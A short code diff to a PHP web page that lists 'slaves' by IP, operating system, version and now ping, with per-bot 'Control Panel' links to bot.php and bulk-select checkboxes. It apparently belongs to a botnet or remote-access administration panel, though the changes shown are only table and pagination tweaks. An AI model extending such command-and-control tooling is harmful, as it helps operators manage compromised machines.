@@ -77,6 +77,7 @@ $(document).ready(function() {
 										<th>IP</th>
 										<th>Operating System</th>
 										<th>Version</th>
+										<th>Ping</th>
 										<th></th>
 										<th><input type="checkbox" class="box" id="selectall"></th>
 									</tr>
@@ -101,7 +102,7 @@ $(document).ready(function() {
 						$start = 0;
 						$max = count($slaves);
 					} else {
-						$page --;
+						$page--;
 						
 						$max = 10;
 						$start = $page * $max;
@@ -125,7 +126,7 @@ $(document).ready(function() {
 						echo printTableData($slave->getIP());
 						echo printTableData($slave->getOperatingSystem());
 						echo printTableData($slave->getVersion());
-						//echo printTableData("<a href='bot.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
+						echo printTableData($slave->getPing());
 						echo printTableData("<a href='bot.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");
 						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
 						echo "</tr>\n";
